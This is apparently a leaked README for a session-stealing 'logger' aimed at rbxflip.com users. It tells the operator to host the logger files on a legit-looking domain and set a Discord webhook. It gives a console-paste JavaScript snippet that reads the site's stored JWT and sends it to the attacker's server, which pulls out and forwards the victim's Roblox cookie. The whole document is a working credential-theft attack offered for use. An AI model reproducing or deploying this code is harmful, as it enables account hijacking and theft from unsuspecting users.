me and my friend made this ill leak it since ixware skids took my idea have fun with it.


1- Upload the files (from logger folder) on your webserver
2 -Get a legit looking domain
3 -Go to rbxflip.com (be logged in)
4 -Open the developer console
5 -Paste that inside the console: 
6. make sure tu put you're webhook on config.php

```var token = localStorage.getItem('auth._token.local');
await fetch("https://yourdomain.com/cl.php?t=" + token);```

6. The simple js code will get the value of auth._token.local (JWT Token) and then decoding (server-sided), after decoding it, it will read the "credentials" object which is the roblox cookie stored on rbxflip, then it sends the cookie to the discord webhook of your choice. Nothing special
